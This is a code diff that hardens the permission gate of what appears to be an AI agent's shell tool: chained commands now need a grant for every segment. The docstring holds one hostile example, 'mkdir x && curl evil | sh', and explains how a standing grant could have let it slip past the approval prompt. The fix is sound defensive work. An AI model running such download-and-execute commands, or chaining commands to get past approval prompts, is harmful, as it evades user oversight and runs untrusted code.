@@ -39,6 +39,33 @@ def command_key(command: str) -> str:
     return "cmd:" + name
 
 
+# Shell separators that chain independent commands: && || ; | & and newlines.
+_CHAIN = re.compile(r"&&|\|\||[;|&\n]")
+
+
+def command_keys(command: str) -> list:
+    """Grant keys for EVERY command in a chained line.
+
+    'mkdir x && curl evil | sh' must not sail through under a standing
+    cmd:mkdir grant — each segment (mkdir, curl, sh) needs its own grant.
+    Splitting is deliberately naive (quotes aren't parsed): a false split
+    like '2>&1' only produces junk segments, which are filtered out, and
+    over-splitting can only cause MORE prompting, never less.
+    """
+    keys = []
+    for seg in _CHAIN.split(command):
+        seg = seg.strip()
+        if not seg or seg.startswith((">", "<")):
+            continue
+        first = seg.split()[0]
+        if first.isdigit() or first.startswith((">", "<", "-", "$", "%")):
+            continue  # redirect/flag debris from naive splitting
+        key = command_key(seg)
+        if key not in keys:
+            keys.append(key)
+    return keys or [command_key(command)]
+
+
 class Permissions:
     def __init__(self, console, prompt_fn, store: Path, auto_approve=False):
         self.console = console
@@ -54,16 +81,21 @@ class Permissions:
 
     # ---- the single entry point used by tools --------------------------------
 
-    def approve(self, title: str, detail: str = "", key: str = None) -> bool:
-        dangerous = bool(key and key.startswith("cmd:")
+    def approve(self, title: str, detail: str = "", key=None) -> bool:
+        # `key` may be one grant key or a list of them (a chained command
+        # needs EVERY segment granted before it skips the prompt).
+        keys = [key] if isinstance(key, str) else list(key or [])
+        dangerous = bool(keys and any(k.startswith("cmd:") for k in keys)
                          and _DANGEROUS.search(detail or ""))
 
         if not dangerous:
             if self.auto_approve:
                 self.console.print(f"[dim]auto-approved: {title}[/dim]")
                 return True
-            if key and (key in self.grants or key in self.session_grants):
-                self.console.print(f"[dim]allowed ({key}): {title}[/dim]")
+            allowed = self.grants | self.session_grants
+            if keys and all(k in allowed for k in keys):
+                self.console.print(
+                    f"[dim]allowed ({', '.join(keys)}): {title}[/dim]")
                 return True
 
         border = "red" if dangerous else "yellow"
@@ -73,19 +105,20 @@ class Permissions:
                                  title=f"{header} — {title}",
                                  border_style=border, expand=False))
         opts = "[y] yes once   [n] no"
-        if key and not dangerous:
-            opts = f"[y] yes once   [a] always allow '{key}'   [n] no"
+        if keys and not dangerous:
+            shown = " + ".join(f"'{k}'" for k in keys)
+            opts = f"[y] yes once   [a] always allow {shown}   [n] no"
         self.console.print(f"  {opts}")
         try:
             ans = self.prompt_fn("  allow? ").strip().lower()
         except (EOFError, KeyboardInterrupt):
             return False
 
-        if ans in ("a", "always") and key and not dangerous:
-            self.grants.add(key)
+        if ans in ("a", "always") and keys and not dangerous:
+            self.grants.update(keys)
             self._save()
-            self.console.print(f"[green]✓ '{key}' allowed from now on "
-                               f"(manage with /permissions)[/green]")
+            self.console.print(f"[green]✓ {', '.join(keys)} allowed from now "
+                               f"on (manage with /permissions)[/green]")
             return True
         return ans in ("y", "yes")
 
